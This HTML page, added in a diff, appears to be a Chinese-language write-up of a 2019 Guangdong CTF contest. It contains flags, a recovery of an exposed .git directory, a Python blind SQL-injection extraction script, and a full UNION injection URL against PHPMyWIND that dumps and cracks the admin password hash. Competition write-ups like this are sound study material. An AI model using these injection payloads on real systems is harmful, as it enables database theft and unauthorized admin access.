@@ -1,0 +1,43 @@
+<!doctype html><html lang=zh-cn><title>广东省红帽杯网络安全攻防大赛 CTF - Write Up - imlonghao</title><meta name=description content="广东省红帽杯网络安全攻防大赛 CTF"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=renderer content="webkit"><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><link rel=dns-prefetch href=//vip1.loli.net><link rel=stylesheet href=/static/hw3x7x.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css integrity="sha256-GxdCIOyfxQ1OBfS99qAIJDoGK1ADuBsxhMTqXG82fAY=" crossorigin=anonymous><script src=/static/hw3x7x.js async></script><script src=https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqus.js integrity="sha256-LVaMHPQ2zLqOc5rXSAfr4d1PIkEGNLyyUTDNPZmTtUw=" crossorigin=anonymous></script><script src=//instant.page/3.0.0 type=module defer integrity=sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1></script><link rel=alternate type=application/rss+xml title="imlonghao Feed" href=https://imlonghao.com/feed.xml><div id=container><div id=header><div id=post-nav><a href=./>Home</a>
+&nbsp;»&nbsp;
+<a href=./48.html>广东省红帽杯网络安全攻防大赛 CTF - Write Up</a></div></div><div class=clearfix></div><div id=title>广东省红帽杯网络安全攻防大赛 CTF - Write Up</div><div id=content class=markdown-body><h2>签到 / Misc / 10pt</h2><p>本期的签到题没有难度，关注微信公众号「CTFer 的魔法棒」，关注后在公众号中发送 ctf 就会自动回复本题的 FLAG<p><img class=lazy data-src=https://vip1.loli.net/2019/12/26/RpjaZlS51qtXrId.jpg><pre><code>flag{BE78989E-1F00-8326-11AD-590B23F48AB3}
+</code></pre><h2>brian(Y) / Crypto / 50pt</h2><p>在我还在做签到题的时候就已经有队伍解出来这道题了，所以估计不会太难。<pre><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;
+++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; ++++[ -&gt;--- -&lt;]&gt;- ----- .&lt;+++ +++[- &gt;---- --&lt;]&gt;
+----- ----- -.+.- ..--- ---.. &lt;++++ +++[- &gt;++++ +++&lt;] &gt;.&lt;++ +++++ [-&gt;--
+----- &lt;]&gt;-- -.+++ .++++ ++.&lt;+ +++++ [-&gt;++ ++++&lt; ]&gt;+++ +++++ .&lt;+++ +++[-
+&gt;---- --&lt;]&gt; ----- ----- .---- ---.+ +++++ +.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++
++++++ .&lt;+++ +++[- &gt;---- --&lt;]&gt; ----- ----- -.--. ---.&lt; +++++ ++[-&gt; +++++
+++&lt;]&gt; ++++. &lt;++++ +++[- &gt;---- ---&lt;] &gt;.+++ +.+++ +.&lt;++ +[-&gt;- --&lt;]&gt; ---.&lt;
++++++ ++[-&gt; +++++ ++&lt;]&gt; +++++ +.&lt;++ ++++[ -&gt;--- ---&lt;] &gt;---- ----- --.+.
+-.-.. ---.+ +++.&lt; +++++ +[-&gt;+ +++++ &lt;]&gt;++ +++++ ++++. &lt;++++ +++[- &gt;----
+---&lt;] &gt;---. &lt;++++ +++[- &gt;++++ +++&lt;] &gt;++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- -----
+----- .&lt;+++ +++++ [-&gt;++ +++++ +&lt;]&gt;+ +++++ ++++. &lt;
+</code></pre><p>观察可知，该密文主要由 +-&lt;>[]. 组成。经过判断，这种语言称为 Brainfuck ，一般由 +-&lt;>[]., 八种字符组成。 使用在线转换网站即可将密文转换回文本，<a href=https://www.splitbrain.org/services/ook rel=nofollow>https://www.splitbrain.org/services/ook</a><pre><code>flag{e676600a-06b4-4a20-b159-d5654415d0c3}
+</code></pre><h2>后台 / Web / 200pt</h2><p>我真的觉得这题给 200 分是放水的。<p>题目已经十分明显得暗示了答案<blockquote><p>经典后台管理系统，系统建成于 2017 年，管理员以建成日期作为口令。</blockquote><p><img class=lazy data-src=https://vip1.loli.net/2019/12/26/OGdtKb8uAQnLzeq.png><p>打开网页， <code>admin</code> 已经作为 <code>value</code> 的参数写在了用户名这一栏当中，可以十分肯定用户名就是 <code>admin</code><p>而密码根据 <code>placeholder="........"</code> 的推测，是有 8 位数的，结合题目的暗示，即为今天的日期： <code>20170506</code><p>输入验证码后登录，即可以轻松拿到 Flag<pre><code>flag{2ac81311-0d7c-4f52-92ae-233ba3515a6d}
+</code></pre><p>##刮刮乐 / Web / 100pt<p>一打开这个网页，首先我关注了他的网页源代码，源代码并没有给出太多的提示。<p>在网上进行了相关的搜索，发现这是一个网上一个经典的 canvas 刮刮乐代码，因此问题应该不再这里。<p>然后我将重点放在了这张图中<p>一开始以为是 png 隐写之类的，通过 binwalk 检测这应该只是一张纯粹的图片<pre><code>imlonghao@imlonghao ~/下载$ binwalk 5286cd31708ef957.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 403 x 214, 8-bit/color RGB, non-interlaced
+77            0x4D            Zlib compressed data, default compression
+</code></pre><p>然后我就关注在了图片本身，「信息泄露第一步」，应该就是暗示我们扫一下网站的目录。<p>很快我便发现了存在 <code>/.git/</code> 目录，然后套上了 GitHack<p>很快下载到了一个 <code>flag.php</code> 文件，我们的 flag 就躺在里面<p><img class=lazy data-src=https://vip1.loli.net/2019/12/26/OGdtKb8uAQnLzeq.png><pre><code>flag{027ea8c2-7be2-4cec-aca3-b6ba400759e8}
+</code></pre><h2>thinkseeker / Web / 300pt</h2><p>这题开始便有意思了，网页打开就是一个非常简单的提交登录框，估计就是 SQL 注入类型的。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/26/NPVE6c79KFCeDHa.png><p>随便输入了一个 <code>userid</code> 和密码，他是以 GET 的方式提交到 / 这个文件的，构成的 URL 就是 <a href="http://106.75.117.4:3083/?userid=1&password=1" rel=nofollow>http://106.75.117.4:3083/?userid=1&password=1</a><p>但是他始终提示我们 <code>Bad token!</code> ，一开始也卡了挺久，后来想应该是和其他参数一样，于是构造了个 <code>http://106.75.117.4:3083/?userid=1&password=1&token=blablabla</code> 的链接<p>经过一轮测试， token 应该为 admin 的 MD5 值，然后我们便通过了 token 的检测。<p>userid 通常按照数据库的自增的话，应该第一个就是 1 ，然后我们知道了这个用户的 userid 为 1<p>然后进行 SQL 的测试，先看看他有什么被过滤的字符<p><code>'</code> <code>"</code> <code>join</code> <code>union</code> , 这些被检测出来之后会提示 <code>inj code!</code> ，过滤得不多，还有挺多的发挥空间。<p>参考了网上的姿势，给 userid 使用了 <code>-1=1=0</code> ，多重判断之后也成功得通过了 userid 的检验，因此尝试从这里进行盲注。<p>于是写了个 Python 脚本进行处理，从 Flag 的第一位开始判断，逐位判断。<pre><code class=language-python>import requests
+
+url = 'http://106.75.117.4:3083/index.php?userid=(ascii(mid((select(flag)from(flag))from(%s)for(1)))=%s)&amp;password=123456&amp;token=21232f297a57a5a743894a0e4a801fc3'
+payloads = '{}-0123456789QWERTYUIOPLKJHGFDSAZXCVBNMqwertyuioplkjhgfdsazxcvbnm'
+flag = ''
+
+for i in range(1, 40):
+    for payload in payloads:
+        text = requests.get(url % (i, ord(payload))).text
+        if 'error userid' not in text:
+            flag += payload
+            continue
+    print(flag)
+
+
+flag{71fb58931b330a83eba9b25e40ac437a}
+</code></pre><p><img class=lazy data-src=https://vip1.loli.net/2019/12/26/wPfAYDuIcKB9m5p.png><h2>PHPMyWIND / Web / 200pt</h2><p><img class=lazy data-src=https://vip1.loli.net/2019/12/26/1OczWxBlVL5kN3P.png><p>首先看了看网站的 Logo ，所使用的版本应该是 2014 年之前的，也就是说我们有很多选择可以进行操作。<p>我所使用的注入点是 <code>shoppingcart.php</code> 这个文件，注入的结果可以直接以 title 的形式返回出来，比较方便。<p>首先直接访问<pre><code>http://106.75.96.7:3089/shoppingcart.php?a=addshopingcart&amp;goodsid=1 and @`'` /*!50000union*/ select null,null,null,null,null,null,null,null,null,null,(Select concat(username,0x7e,password) from `pmw_admin` where id=1),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from pmw_admin where 1=1 or @`'`&amp;buynum=1&amp;goodsattr=tpcs
+</code></pre><p>然后在查看我们的购物车<p><a href=http://106.75.96.7:3089/shoppingcart.php rel=nofollow>http://106.75.96.7:3089/shoppingcart.php</a><p><img class=lazy data-src=https://vip1.loli.net/2019/12/26/4v2RYBHuPwZNsQn.png><p>我们就拿到了管理员的用户名和密码，分别是 <code>admin</code> 和 <code>4027875a97a7787b9032ea46dae45d05</code><p>通过 CMD5 不难解出 4027875a97a7787b9032ea46dae45d05 的明文就是 666888<p>使用 admin 和 666888 即可登录到后台，后台的地址也是默认的地址： <a href=http://106.75.96.7:3089/admin/ rel=nofollow>http://106.75.96.7:3089/admin/</a><p>本来是想通过后台 getshell 进行操作然后拿 Flag 的，但是管理员限制了所有上传目录权限，也禁止了修改网站的配置文件。<p>想了想上午题目刚出来的时候目标站被各种 phpinfo 所占据，影响到很多队伍参赛，我就断定应该是管理员故意禁止的，可能出题人并不希望我们拿 shell ，而是应该将 Flag 写在了网站的某个地方，于是把所有能点的地方点了一遍。<p>最后找到了这个叫 默认模板文件管理 的地方，发现了我们的 Flag<p><img class=lazy data-src=https://vip1.loli.net/2019/12/26/g47eZqkdz6EXJoL.png><p>于是直接访问这个地址，顺利拿到 Flag<p><img class=lazy data-src=https://vip1.loli.net/2019/12/26/xc6mvNojrMXs9Cu.png><pre><code>flag{14070c9e-bab5-47ec-88f7-9e574bd328f6}
+</code></pre></div></div><div id=disqus_thread></div><div id=footer><span>Copyright © 2015 - 2020 imlonghao. Theme by
+<a href=http://simiki.org/ target=_blank rel="noopener noreferrer">Simiki</a>. CC BY-NC-SA 4.0</span></div><script src=https://cdn.jsdelivr.net/npm/cfga@1.0.3/cfga.min.js integrity="sha256-TXHTTKAPRQ9mgacgN+couk0xnzQ6uOXTZ5ojH1q6GUk=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/vanilla-lazyload@12.3.0/dist/lazyload.min.js integrity="sha256-bojBIKfs4l2WDcJODncBIGEe5fhU7/sM3zRO5/f2nqE=" crossorigin=anonymous async></script>
